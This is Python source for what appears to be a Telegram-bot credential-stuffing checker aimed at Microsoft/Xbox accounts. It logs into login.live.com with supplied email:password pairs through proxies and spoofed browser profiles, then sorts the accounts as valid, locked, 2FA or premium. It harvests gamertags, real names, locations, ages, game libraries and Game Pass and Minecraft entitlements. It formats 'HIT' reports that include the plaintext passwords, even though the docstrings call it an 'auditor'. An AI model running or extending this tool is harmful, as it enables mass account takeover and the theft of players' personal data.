        cur_url = cur.url if hasattr(cur, "url") else up2
        c = xbox_extract_code(cur_url)
        if c:
            code = c
            break
        if cur.status_code in (301, 302, 303, 307, 308) and loc:
            nxt = xbox_solve_base(cur_url, loc)
            c = xbox_extract_code(nxt)
            if c:
                code = c
                break
            intr = xbox_persentio_challenge("", nxt)
            if intr:
                return None, {"type": "challenge", "reason": intr}
            try:
                cur = sessio.get(nxt, allow_redirects=False, timeout=25,
                                 headers={"sec-fetch-site": "same-site"})
            except Exception:
                break
            continue
        html = cur.text or ""
        intr = xbox_persentio_challenge(html, cur_url)
        if intr:
            return None, {"type": "challenge", "reason": intr}
        pn, un = xbox_interpreta_psft(html)
        if pn and un:
            if resubmits >= 1:
                return None, {"type": "bad", "reason": "no_code_after_hops"}
            resubmits += 1
            try:
                cur = sessio.post(un, data=xbox_compone_forma({
                    "ps": "2", "PPFT": pn, "PPSX": "Pass",
                    "NewUser": "1", "FoundMSAs": "", "fspost": "0",
                    "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "1",
                    "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i13": "0",
                    "login": email, "loginfmt": email, "type": "11",
                    "LoginOptions": "3", "cpr": "0",
                    "passwd": password, "vanguardflowtoken": vanguard,
                }), headers={"content-type": "application/x-www-form-urlencoded",
                             "origin": "https://login.live.com",
                             "referer": cur_url},
                    allow_redirects=False, timeout=25)
                continue
            except Exception:
                pass
        submitted = False
        for fm in re.finditer(r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE):
            action = fm.group(1).replace("&amp;", "&")
            fb = fm.group(2)
            if not action:
                continue
            campi = {}
            for inp in re.finditer(r"<input[^>]+>", fb, re.IGNORECASE):
                n = re.search(r'name="([^"]+)"', inp.group(0))
                v = re.search(r'value="([^"]*)"', inp.group(0))
                if n:
                    campi[n.group(1)] = v.group(1) if v else ""
            if not campi:
                continue
            if "passwd" in campi:
                if resubmits >= 1:
                    return None, {"type": "bad", "reason": "no_code_after_hops"}
                resubmits += 1
            act_url = xbox_solve_base(cur_url, action)
            intr = xbox_persentio_challenge("", act_url)
            if intr:
                return None, {"type": "challenge", "reason": intr}
            try:
                cur = sessio.post(act_url, data=xbox_compone_forma(campi),
                                  headers={"content-type": "application/x-www-form-urlencoded",
                                           "origin": "https://login.live.com",
                                           "referer": cur_url},
                                  allow_redirects=False, timeout=25)
                submitted = True
                break
            except Exception:
                continue
        if submitted:
            continue
        next_link = re.search(r'<a[^>]+href="([^"]+)"[^>]*>\s*(?:Next|Continue|Yes|OK)\s*</a>',
                              html, re.IGNORECASE)
        if next_link:
            nxt = xbox_solve_base(cur_url, next_link.group(1).replace("&amp;", "&"))
            try:
                cur = sessio.get(nxt, allow_redirects=False, timeout=25)
                continue
            except Exception:
                pass
        return None, {"type": "bad", "reason": "no_code"}

    if not code:
        final_url = cur.url if hasattr(cur, "url") else up2
        intr = xbox_persentio_challenge(cur.text if hasattr(cur, "text") else "", final_url)
        if intr:
            return None, {"type": "challenge", "reason": intr}
        return None, {"type": "bad", "reason": "no_code_after_hops"}

    tb = xbox_compone_forma({
        "client_id": XBOX_MS_CLIENT, "redirect_uri": XBOX_MS_REDIRECT,
        "scope": XBOX_MS_SCOPE, "code": code,
        "grant_type": "authorization_code",
        "code_verifier": verifier, "client_info": "1",
    })
    try:
        r5 = sessio.post("https://login.live.com/oauth20_token.srf", data=tb,
                         headers={"content-type": "application/x-www-form-urlencoded;charset=utf-8",
                                  "origin": "https://login.live.com",
                                  "referer": "https://login.live.com/"},
                         timeout=25)
    except Exception:
        return None, {"type": "token_net"}
    if r5.status_code != 200:
        return None, {"type": f"token_{r5.status_code}"}
    try:
        j5 = r5.json()
    except Exception:
        return None, {"type": "token_non_json"}
    if not j5.get("access_token"):
        return None, {"type": "no_access_token"}
    return {"session": sessio, "token": j5["access_token"]}, None


def xbox_sso(sessio):
    verifier, challenge = xbox_fabrica_pkce()
    state = base64.urlsafe_b64encode(json.dumps({
        "id": str(uuid.uuid4()),
        "meta": {"interactionType": "redirect"},
    }).encode()).rstrip(b"=").decode()
    qs = [
        f"client_id={XBOX_XBL_CLIENT}",
        f"scope={requests.utils.quote(XBOX_XBL_SCOPE, safe='')}",
        f"redirect_uri={requests.utils.quote(XBOX_XBL_REDIRECT, safe='')}",
        "response_type=code",
        f"state={state}",
        "response_mode=fragment",
        f"nonce={str(uuid.uuid4())}",
        f"code_challenge={challenge}",
        "code_challenge_method=S256",
        "x-client-SKU=msal.js.browser",
        "x-client-Ver=3.20.0",
        f"uaid={uuid.uuid4().hex}",
        "msproxy=1", "issuer=mso", "tenant=consumers", "ui_locales=en-IN",
        "client_info=1", "jshs=0", "prompt=none",
    ]
    auth_url = "https://login.live.com/oauth20_authorize.srf?" + "&".join(qs)
    try:
        r = sessio.get(auth_url, allow_redirects=False, timeout=25,
                       headers={"referer": "https://www.xbox.com/"})
    except Exception:
        return None, {"type": "sso_net"}
    loc = r.headers.get("Location", "") or ""
    code = xbox_extract_code(loc)
    if not code and r.status_code in (301, 302, 303, 307, 308) and loc:
        nxt = xbox_solve_base(auth_url, loc)
        try:
            r2 = sessio.get(nxt, allow_redirects=False, timeout=25)
            loc2 = r2.headers.get("Location", "") or ""
            code = xbox_extract_code(loc2) or xbox_extract_code(nxt)
        except Exception:
            pass
    if not code:
        return None, {"type": "sso_no_code"}
    tb = xbox_compone_forma({
        "client_id": XBOX_XBL_CLIENT, "redirect_uri": XBOX_XBL_REDIRECT,
        "scope": XBOX_XBL_SCOPE, "code": code,
        "grant_type": "authorization_code",
        "code_verifier": verifier, "client_info": "1",
    })
    try:
        r3 = sessio.post("https://login.live.com/oauth20_token.srf", data=tb,
                         headers={"content-type": "application/x-www-form-urlencoded;charset=utf-8",
                                  "origin": "https://login.live.com",
                                  "referer": "https://login.live.com/"},
                         timeout=25)
    except Exception:
        return None, {"type": "sso_token_net"}
    if r3.status_code != 200:
        return None, {"type": f"sso_token_{r3.status_code}"}
    try:
        j = r3.json()
    except Exception:
        return None, {"type": "sso_token_non_json"}
    if not j.get("access_token"):
        return None, {"type": "sso_no_token"}
    return {"token": j["access_token"]}, None


def xbox_xbl_user(ms_token, profile=None):
    sessio = xbox_fabrica_sessio(profile=profile)
    body = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": f"d={ms_token}",
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT",
    }
    try:
        r = sessio.post("https://user.auth.xboxlive.com/user/authenticate",
                        json=body,
                        headers={"x-xbl-contract-version": "1",
                                 "origin": "https://www.xbox.com",
                                 "referer": "https://www.xbox.com/"},
                        timeout=25)
    except Exception:
        return None, {"type": "xbl_user_net"}
    try:
        j = r.json()
    except Exception:
        return None, {"type": "xbl_user_non_json"}
    if not j.get("Token"):
        return None, {"type": "xbl_user_no_token"}
    return {"token": j["Token"]}, None


def xbox_authorizo(xbl_token, rp, profile=None):
    sessio = xbox_fabrica_sessio(profile=profile)
    body = {
        "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
        "RelyingParty": rp, "TokenType": "JWT",
    }
    try:
        r = sessio.post("https://xsts.auth.xboxlive.com/xsts/authorize",
                        json=body,
                        headers={"x-xbl-contract-version": "1",
                                 "origin": "https://www.xbox.com",
                                 "referer": "https://www.xbox.com/"},
                        timeout=25)
    except Exception:
        return None, {"type": "xsts_net"}
    try:
        j = r.json()
    except Exception:
        return None, {"type": "xsts_non_json"}
    xerr = j.get("XErr")
    if xerr:
        mapping = {
            2148916227: "banned_account",
            2148916233: "no_xbox_account",
            2148916235: "banned_region",
            2148916236: "adult_verification_required",
            2148916237: "adult_verification_required",
            2148916238: "child_account",
        }
        return None, {"type": "xsts_fail", "xerr": xerr, "reason": mapping.get(xerr, "unknown")}
    if r.status_code != 200:
        return None, {"type": f"xsts_http_{r.status_code}"}
    token = j.get("Token")
    c0 = ((j.get("DisplayClaims") or {}).get("xui") or [{}])[0]
    if not token or not c0.get("uhs"):
        return None, {"type": "xsts_no_token"}
    return {
        "token": token, "uhs": c0.get("uhs"), "xuid": c0.get("xid"),
        "gtg": c0.get("gtg"), "agg": c0.get("agg"),
        "prv": c0.get("prv"), "ugc": c0.get("ugc"),
        "auth": f"XBL3.0 x={c0.get('uhs')};{token}",
        "raw": j,
    }, None


def xbox_profano(auth, xuid, profile=None):
    sessio = xbox_fabrica_sessio(profile=profile)
    settings = ("Gamertag,GameDisplayPicRaw,Gamerscore,AccountTier,"
                "XboxOneRep,RealName,Bio,TenureLevel,Location,"
                "ModernGamertag,ModernGamertagSuffix,UniqueModernGamertag,"
                "Watermarks,IsQuarantined,PreferredColor")
    url = f"https://profile.xboxlive.com/users/xuid({xuid})/profile/settings?settings={settings}"
    try:
        r = sessio.get(url, headers={"authorization": auth,
                                     "x-xbl-contract-version": "3",
                                     "accept": "application/json"},
                       timeout=25)
    except Exception:
        return None
    if r.status_code != 200:
        return None
    try:
        j = r.json()
    except Exception:
        return None
    out = {}
    users = j.get("profileUsers") or []
    if users:
        for s in users[0].get("settings") or []:
            out[s.get("id")] = s.get("value")
    return out


def xbox_titulos(auth, xuid, profile=None):
    sessio = xbox_fabrica_sessio(profile=profile)
    url = (f"https://titlehub.xboxlive.com/users/xuid({xuid})/titles/titlehistory"
           f"/decoration/Achievement,Image,Detail,Scid,GamePass")
    try:
        r = sessio.get(url, headers={"authorization": auth,
                                     "x-xbl-contract-version": "2",
                                     "accept": "application/json",
                                     "accept-language": "en-US"},
                       timeout=30)
    except Exception:
        return None
    if r.status_code != 200:
        return None
    try:
        j = r.json()
    except Exception:
        return None
    return j.get("titles") or []


def xbox_gamepass_catalog(mp_auth, profile=None):
    if not mp_auth:
        return {}
    sessio = xbox_fabrica_sessio(profile=profile)
    url = ("https://catalog.gamepass.com/v3/products?market=IN&language=en-IN"
           "&hydration=RemoteHighUserTitanite0")
    try:
        r = sessio.post(url, json={"Products": list(XBOX_SKUS.keys())},
                        headers={"content-type": "application/json",
                                 "accept": "application/json",
                                 "calling-app-name": "Xbox Cloud Gaming Web",
                                 "calling-app-version": "29.20.10",
                                 "referer": "https://www.xbox.com/",
                                 "x-store-authorization": mp_auth,
                                 "ms-cv": f"{uuid.uuid4().hex[:16]}.{random.randint(1,9)}"},
                        timeout=25)
    except Exception:
        return {}
    if r.status_code != 200:
        return {}
    try:
        j = r.json()
    except Exception:
        return {}
    products = j.get("Products") or {}
    subs = []
    for sku, info in products.items():
        if info.get("HasPurchased"):
            subs.append(XBOX_SKUS.get(sku, sku))
    return {"raw": products, "active": subs}


def xbox_aestima_score(t):
    for k in ("currentGamerscore", "achievement", "gamerscore", "score"):
        v = t.get(k)
        if isinstance(v, (int, float)):
            return int(v)
        if isinstance(v, str) and v.isdigit():
            return int(v)
        if isinstance(v, dict):
            gs = v.get("currentGamerscore") or v.get("gamerscore") or v.get("score")
            if gs is not None:
                try:
                    return int(gs)
                except (ValueError, TypeError):
                    pass
    return 0


def xbox_est_premium(t):
    gp = t.get("gamePass")
    if isinstance(gp, dict) and gp.get("isGamePass") is True:
        return True
    return False


def xbox_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    """
    Full Xbox Live auditor. Returns:
    {status: ok|bad|locked|no_xbox|error, verdict: premium|hit|free (if ok), ...}
    """
    prof = xbox_random_profile()
    sessio = xbox_fabrica_sessio(proxy, profile=prof)
    try:
        r1, err = xbox_ms_ingressus(sessio, email, password)
        if err:
            t = err.get("type", "")
            if t == "bad":
                return {"status": "BAD", "reason": err.get("reason", "wrong_password"),
                        "email": email, "password": password}
            if t == "locked":
                return {"status": "LOCKED", "reason": err.get("reason", "account_locked"),
                        "email": email, "password": password}
            if t == "challenge":
                return {"status": "LOCKED", "reason": err.get("reason", "challenge_required"),
                        "email": email, "password": password}
            return {"status": "ERROR", "error_type": t, "email": email, "password": password}

        r2, err = xbox_sso(sessio)
        if err:
            return {"status": "ERROR", "error_type": err.get("type", "sso"),
                    "email": email, "password": password}

        r3, err = xbox_xbl_user(r2["token"], profile=prof)
        if err:
            return {"status": "ERROR", "error_type": err.get("type", "xbl_user"),
                    "email": email, "password": password}

        r4, err = xbox_authorizo(r3["token"], "http://xboxlive.com", profile=prof)
        if err:
            if err.get("type") == "xsts_fail":
                causa = err.get("reason", "xsts_fail")
                if causa == "no_xbox_account":
                    return {"status": "NO_XBOX", "email": email, "password": password, "uhs": None}
                return {"status": "LOCKED", "reason": causa, "email": email, "password": password}
            return {"status": "ERROR", "error_type": err.get("type", "xsts"),
                    "email": email, "password": password}

        xuid = r4["xuid"]
        auth = r4["auth"]
        r5, _ = xbox_authorizo(r3["token"], "http://mp.microsoft.com/", profile=prof)
        mp_auth = r5["auth"] if r5 else None

        prof_data = xbox_profano(auth, xuid, profile=prof) or {}
        titles = xbox_titulos(auth, xuid, profile=prof) or []
        gp = xbox_gamepass_catalog(mp_auth, profile=prof)

        games = []
        for t in titles:
            nomen = t.get("name") or ""
            if not nomen:
                continue
            if (t.get("type") or "").lower() == "app":
                continue
            games.append({
                "name": nomen,
                "titleId": t.get("titleId"),
                "score": xbox_aestima_score(t),
                "type": t.get("type") or "",
                "devices": t.get("devices") or [],
                "premium": xbox_est_premium(t),
            })

        gamertag     = prof_data.get("Gamertag") or r4.get("gtg") or ""
        gamerscore   = prof_data.get("Gamerscore") or "0"
        tenure       = prof_data.get("TenureLevel") or "0"
        tier         = (prof_data.get("AccountTier") or "").strip()
        reputation   = prof_data.get("XboxOneRep") or ""
        location     = prof_data.get("Location") or ""
        real_name    = prof_data.get("RealName") or ""
        bio          = prof_data.get("Bio") or ""

        has_minecraft  = any("minecraft" in (g.get("name") or "").lower() for g in games)
        premium_games  = [g for g in games if g.get("premium")]
        active_subs    = gp.get("active") or []
        games_count    = len(games)

        if games_count == 0:
            verdict = "FREE"
        elif active_subs or premium_games:
            verdict = "PREMIUM"
        else:
            verdict = "HIT"

        content = (
            f"{email}:{password} | "
            f"XUID={xuid} | GT={gamertag} | GS={gamerscore} | "
            f"Games={games_count} | PremGames={len(premium_games)} | "
            f"Subs={','.join(active_subs) or 'none'} | "
            f"Tier={tier or 'N/A'} | MC={'Y' if has_minecraft else 'N'} | "
            f"CC={location or 'N/A'} | Age={r4.get('agg') or 'N/A'} | "
            f"Verdict={verdict}"
        )

        return {
            "status": "OK",
            "verdict": verdict,
            "email": email, "password": password,
            "xuid": xuid, "uhs": r4["uhs"],
            "gamertag": gamertag,
            "age": r4.get("agg") or "",
            "account_tier": tier,
            "gamerscore": gamerscore,
            "tenure": tenure,
            "reputation": reputation,
            "location": location,
            "real_name": real_name,
            "bio": bio,
            "ugc": r4.get("ugc") or "",
            "games": games,
            "games_count": games_count,
            "premium_count": len(premium_games),
            "has_minecraft": has_minecraft,
            "subs": active_subs,
            "content": content,
        }
    except Exception as e:
        return {"status": "ERROR", "error_type": f"crash_{type(e).__name__}",
                "email": email, "password": password, "reason": str(e)[:60]}
    finally:
        try:
            sessio.close()
        except Exception:
            pass


def xbox_fmt_premium(r: dict) -> str:
    subs = ", ".join(r.get("subs") or []) or "none"
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {XB_PREMIUM} <b>XBOX PREMIUM HIT</b>        ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email      :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password   :</b> <code>{r.get('password','?')}</code>\n"
        f"{XB_TAG}  <b>Gamertag   :</b> <code>{r.get('gamertag','N/A')}</code>\n"
        f"{E_ID}  <b>XUID       :</b> <code>{r.get('xuid','?')}</code>\n"
        f"{XB_SCORE}  <b>Gamerscore :</b> <code>{r.get('gamerscore','0')}G</code>\n"
        f"{XB_GAME}  <b>Games      :</b> <code>{r.get('games_count','0')}</code>\n"
        f"{XB_GAME}  <b>Prem Games :</b> <code>{r.get('premium_count','0')}</code>\n"
        f"{XB_SUB}  <b>Subs       :</b> <code>{subs}</code>\n"
        f"{E_COUNTRY}  <b>Region     :</b> <code>{r.get('location','N/A')}</code>\n"
        f"{E_CLOCK}  <b>Tenure     :</b> <code>{r.get('tenure','0')} years</code>\n"
        f"{XB_MC}  <b>Minecraft  :</b> <code>{'YES' if r.get('has_minecraft') else 'NO'}</code>"
    )


def xbox_fmt_hit(r: dict) -> str:
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {XB_HIT} <b>XBOX HIT</b>                ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email      :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password   :</b> <code>{r.get('password','?')}</code>\n"
        f"{XB_TAG}  <b>Gamertag   :</b> <code>{r.get('gamertag','N/A')}</code>\n"
        f"{E_ID}  <b>XUID       :</b> <code>{r.get('xuid','?')}</code>\n"
        f"{XB_SCORE}  <b>Gamerscore :</b> <code>{r.get('gamerscore','0')}G</code>\n"
        f"{XB_GAME}  <b>Games      :</b> <code>{r.get('games_count','0')}</code>\n"
        f"{XB_MC}  <b>Minecraft  :</b> <code>{'YES' if r.get('has_minecraft') else 'NO'}</code>"
    )


def xbox_fmt_free(r: dict) -> str:
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {XB_FREE} <b>XBOX FREE ACCOUNT</b>      ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email      :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password   :</b> <code>{r.get('password','?')}</code>\n"
        f"{XB_TAG}  <b>Gamertag   :</b> <code>{r.get('gamertag','N/A')}</code>\n"
        f"{E_ID}  <b>XUID       :</b> <code>{r.get('xuid','?')}</code>\n"
        f"{XB_SCORE}  <b>Gamerscore :</b> <code>{r.get('gamerscore','0')}G</code>"
    )


def xbox_fmt_progress(done: int, total: int, premium: int, hit: int, free: int,
                      noxbox: int, bad: int, locked: int, err: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Xbox Auditor</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{XB_PREMIUM} Premium : <b>{premium}</b>\n"
        f"{XB_HIT} Hit     : <b>{hit}</b>\n"
        f"{XB_FREE} Free    : <b>{free}</b>\n"
        f"{XB_NOXBOX} No Xbox : <b>{noxbox}</b>\n"
        f"{SS_DEAD} Bad     : <b>{bad}</b>\n"
        f"{MSFC_2FA} Locked  : <b>{locked}</b>\n"
        f"❌ Error : <b>{err}</b>"
    )


def xbox_fmt_summary(total: int, premium: int, hit: int, free: int,
                     noxbox: int, bad: int, locked: int, err: int, elapsed: float) -> str:
    pct = f"{premium / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Xbox Check Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total   : <b>{total}</b>\n"
        f"{XB_PREMIUM} Premium : <b>{premium}</b>  (<i>{pct}%</i>)\n"
        f"{XB_HIT} Hit     : <b>{hit}</b>\n"
        f"{XB_FREE} Free    : <b>{free}</b>\n"
        f"{XB_NOXBOX} No Xbox : <b>{noxbox}</b>\n"
        f"{SS_DEAD} Bad     : <b>{bad}</b>\n"
        f"{MSFC_2FA} Locked  : <b>{locked}</b>\n"
        f"❌ Error : <b>{err}</b>\n"
        f"{E_CLOCK} Time    : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ▼ P3 END — PASTE P4 (Xbox Cap engine) AFTER THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    XBOX FULL CAPTURE ENGINE (new)                       ║
# ║    Simpler PPFT-based checker — captures gamertag, gamerscore,          ║
# ║    GamePass status, games list with premium tags.                       ║
# ╚══════════════════════════════════════════════════════════════════════════╝

XBOXCAP_PREMIUM_KEYWORDS = [
    "resident evil", "fifa", "fc 24", "fc 25", "fc 26", "modern warfare",
    "call of duty", "black ops", "pes", "efootball", "rust", "elden ring",
    "dark souls", "ark",
]

XBOXCAP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def _xboxcap_extract_games(session, uhs: str, xsts_token: str, max_items: int = 200) -> str:
    """Fetch games list from achievements.xboxlive.com. Returns formatted string or ''."""
    formatted = ""
    try:
        me_url = "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag"
        headers = {
            "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
            "x-xbl-contract-version": "2",
            "Accept": "application/json",
        }
        me_resp = session.get(me_url, headers=headers, timeout=15)
        if me_resp.status_code != 200:
            return ""
        xuid = me_resp.json()["profileUsers"][0]["id"]

        ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles?maxItems={max_items}"
        ach_resp = session.get(ach_url, headers=headers, timeout=15)
        if ach_resp.status_code != 200:
            return ""

        titles = ach_resp.json().get("titles", [])
        for i, t in enumerate(titles, 1):
            game_name = t.get("name", "Unknown Game")
            current_score = t.get("currentGamerscore", 0)
            is_premium = any(k in game_name.lower() for k in XBOXCAP_PREMIUM_KEYWORDS)
            premium_tag = " | [PREMIUM]" if is_premium else ""
            formatted += f"   {i} - {game_name} | Score: {current_score}G{premium_tag}\n"
    except Exception:
        pass
    return formatted


def xboxcap_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    """
    Xbox Full Capture — simpler PPFT-based check.
    Returns:
      HIT: full account data with games list + GamePass status
      BAD: wrong credentials or empty account
      2FA: needs 2FA
      ERROR: exception
    """
    session = requests.Session()
    session.verify = False
    if _URLLIB3_RETRY_OK:
        try:
            adapter = HTTPAdapter(
                pool_connections=10, pool_maxsize=10,
                max_retries=Urllib3Retry(total=1, backoff_factor=1.5,
                                         status_forcelist=[429, 500, 502, 503, 504]),
            )
            session.mount("https://", adapter)
            session.mount("http://", adapter)
        except Exception:
            pass
    session.headers.update({"User-Agent": XBOXCAP_UA})
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    try:
        # Step 1: Get PPFT + urlPost from oauth20_authorize
        sftag_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )
        resp = session.get(sftag_url, timeout=15)
        sftag_m = re.search(r'value=\\\"(.+?)\\\"', resp.text)
        url_post_m = re.search(r'"urlPost":"(.+?)"', resp.text)
        if not sftag_m or not url_post_m:
            return {"status": "ERROR", "error_type": "no_ppft",
                    "email": email, "password": password}
        sftag = sftag_m.group(1)
        url_post = url_post_m.group(1).replace("\\/", "/")

        # Step 2: Login POST
        login_req = session.post(
            url_post,
            data={"login": email, "loginfmt": email, "passwd": password, "PPFT": sftag},
            timeout=15,
            allow_redirects=True,
        )

        # Step 3: Extract MS token or detect 2FA/bad
        ms_token = None
        login_text_lower = (login_req.text or "").lower()
        login_url_lower = (login_req.url or "").lower()

        if "access_token" in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get("access_token", [None])[0]
        elif ("identity/confirm" in login_text_lower
              or "consent" in login_text_lower
              or "verify your identity" in login_text_lower
              or "two-step" in login_text_lower
              or "enter the code" in login_text_lower):
            return {"status": "2FA", "reason": "2fa_required",
                    "email": email, "password": password}
        elif "password is incorrect" in login_text_lower or "invalid" in login_text_lower:
            return {"status": "BAD", "reason": "bad_credentials",
                    "email": email, "password": password}

        if not ms_token:
            return {"status": "BAD", "reason": "no_token",
                    "email": email, "password": password}

        # Step 4: XBL user authenticate
        try:
            xb_req = session.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json={
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": ms_token,
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT",
                },
                timeout=15,
            )
            if xb_req.status_code != 200:
                return {"status": "BAD", "reason": "xbl_user_failed",
                        "email": email, "password": password}
            xb_json = xb_req.json()
            xb_token = xb_json.get("Token")
            uhs = (xb_json.get("DisplayClaims", {}).get("xui", [{}])[0]).get("uhs")
            if not xb_token or not uhs:
                return {"status": "BAD", "reason": "no_xbl_token",
                        "email": email, "password": password}
        except Exception as e:
            return {"status": "ERROR", "error_type": f"xbl_{type(e).__name__}",
                    "email": email, "password": password}

        # Step 5: XSTS authorize (xboxlive.com)
        gamerscore_int = 0
        games_list = ""
        gamertag = ""
        xsts_xb_req = session.post(
            "https://xsts.auth.xboxlive.com/xsts/authorize",
            json={
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                "RelyingParty": "http://xboxlive.com",
                "TokenType": "JWT",
            },
            timeout=15,
        )

        if xsts_xb_req.status_code != 200:
            xerr = 0
            try:
                xerr = xsts_xb_req.json().get("XErr", 0)
            except Exception:
                pass
            if xerr == 2148916233:
                return {"status": "BAD", "reason": "no_xbox_account",
                        "email": email, "password": password}
            if xerr in (2148916227, 2148916235):
                return {"status": "BAD", "reason": "banned",
                        "email": email, "password": password}
            if xerr in (2148916236, 2148916237, 2148916238):
                return {"status": "BAD", "reason": "adult_verification_or_child",
                        "email": email, "password": password}
            return {"status": "BAD", "reason": f"xsts_{xsts_xb_req.status_code}",
                    "email": email, "password": password}

        try:
            xsts_json = xsts_xb_req.json()
            x_token = xsts_json.get("Token")
            x_uhs = (xsts_json.get("DisplayClaims", {}).get("xui", [{}])[0]).get("uhs") or uhs
            x_gtg = (xsts_json.get("DisplayClaims", {}).get("xui", [{}])[0]).get("gtg")
            if x_gtg:
                gamertag = x_gtg

            games_list = _xboxcap_extract_games(session, x_uhs, x_token)

            prof_req = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamerscore,Gamertag",
                headers={
                    "Authorization": f"XBL3.0 x={x_uhs};{x_token}",
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                },
                timeout=15,
            )
            if prof_req.status_code == 200:
                settings = prof_req.json()["profileUsers"][0].get("settings", [])
                for s in settings:
                    if s.get("id") == "Gamerscore":
                        try:
                            gamerscore_int = int(s.get("value", "0"))
                        except (ValueError, TypeError):
                            pass
                    elif s.get("id") == "Gamertag":
                        gamertag = s.get("value") or gamertag
        except Exception as e:
            return {"status": "ERROR", "error_type": f"profile_{type(e).__name__}",
                    "email": email, "password": password}

        if gamerscore_int < 5:
            return {"status": "BAD", "reason": "low_gamerscore",
                    "email": email, "password": password,
                    "gamerscore": gamerscore_int}

        # Step 6: Minecraft / GamePass detection
        gamepass_status = "none"
        try:
            xsts_mc_req = session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT",
                },
                timeout=15,
            )
            if xsts_mc_req.status_code == 200:
                mc_token = xsts_mc_req.json().get("Token")
                if mc_token:
                    mc_auth = session.post(
                        "https://api.minecraftservices.com/authentication/login_with_xbox",
                        json={"identityToken": f"XBL3.0 x={uhs};{mc_token}"},
                        timeout=15,
                    )
                    if mc_auth.status_code == 200:
                        mc_access = mc_auth.json().get("access_token")
                        if mc_access:
                            ent_req = session.get(
                                "https://api.minecraftservices.com/entitlements/mcstore",
                                headers={"Authorization": f"Bearer {mc_access}"},
                                timeout=15,
                            )
                            ent_t = (ent_req.text or "").lower()
                            if "product_game_pass_ultimate" in ent_t:
                                gamepass_status = "Ultimate"
                            elif "product_game_pass_pc" in ent_t:
                                gamepass_status = "PC"
                            elif "product_game_pass_extra" in ent_t:
                                gamepass_status = "Extra"
                            elif "product_game_pass_premium" in ent_t:
                                gamepass_status = "Premium"
                            elif "product_game_pass_core" in ent_t:
                                gamepass_status = "Core"
                            elif "product_game_pass" in ent_t:
                                gamepass_status = "Standard"
        except Exception:
            pass

        # Build result
        verdict = "PREMIUM" if gamepass_status != "none" else "HIT"
        content = (
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"Gamertag: {gamertag or 'N/A'}\n"
            f"Gamerscore: {gamerscore_int}G\n"
            f"GamePass: {gamepass_status}\n"
            f"Games:\n{games_list or '   (no games found)\n'}"
        )

        return {
            "status": "HIT",
            "verdict": verdict,
            "email": email,
            "password": password,
            "gamertag": gamertag or "N/A",
            "gamerscore": gamerscore_int,
            "gamepass": gamepass_status,
            "games_list": games_list or "",
            "games_count": games_list.count("\n") if games_list else 0,
            "content": content,
        }

    except requests.exceptions.Timeout:
        return {"status": "ERROR", "error_type": "timeout",
                "email": email, "password": password}
    except Exception as e:
        return {"status": "ERROR", "error_type": f"crash_{type(e).__name__}",
                "email": email, "password": password, "reason": str(e)[:60]}
    finally:
        try:
            session.close()
        except Exception:
            pass


def xboxcap_fmt_hit(r: dict) -> str:
    icon = XB_PREMIUM if r.get("verdict") == "PREMIUM" else XB_HIT
    title = "XBOX FULL CAP — PREMIUM" if r.get("verdict") == "PREMIUM" else "XBOX FULL CAP HIT"
    games_preview = r.get("games_list") or ""
    if len(games_preview) > 900:
        games_preview = games_preview[:900] + "\n   ... (truncated)"
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {icon} <b>{title}</b>       ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email      :</b> <code>{r.get('email','?')}</code>\n"
